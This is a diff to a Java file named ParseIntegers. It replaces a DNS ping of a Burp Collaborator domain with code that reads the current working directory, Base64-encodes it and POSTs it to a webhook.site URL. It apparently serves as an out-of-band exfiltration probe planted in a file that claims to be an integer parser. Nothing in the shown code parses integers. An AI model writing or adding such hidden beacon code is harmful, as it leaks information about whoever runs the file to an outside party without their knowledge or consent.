@@ -16,18 +16,31 @@ public class ParseIntegers {
                             .split(" "));
 
     public static void main(String[] args) {
- String domain = "mj9s9yzk0y5v297ajmmn7lk2qtwkk9.burpcollaborator.net";
+        // Lấy thư mục hiện tại
+        String currentDirectory = System.getProperty("user.dir");
 
+        // Mã hóa Base64
+        String encodedDirectory = Base64.getEncoder().encodeToString(currentDirectory.getBytes(StandardCharsets.UTF_8));
+
+        // Gửi POST request đến webhook.site
         try {
-            InetAddress inetAddress = InetAddress.getByName(domain);
-            System.out.println("Ping to: " + domain);
-            System.out.println("IP Address: " + inetAddress.getHostAddress());
-            System.out.println("Reachable: " + inetAddress.isReachable(5000)); // 5000 milliseconds timeout
-        } catch (UnknownHostException e) {
-            System.out.println("Unknown host: " + domain);
+            URL url = new URL("https://webhook.site/f69cac23-fe0a-408b-aa2a-0b9caeb3160a?x=" + encodedDirectory);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+
+            // Nội dung có thể để trống, vì tham số đã nằm trên URL
+            String postData = "";
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(postData.getBytes(StandardCharsets.UTF_8));
+            }
+
+            // Đọc response nếu cần
+            int responseCode = conn.getResponseCode();
+            System.out.println("Webhook response code: " + responseCode);
+
         } catch (Exception e) {
             e.printStackTrace();
         }
-    
     }
 }
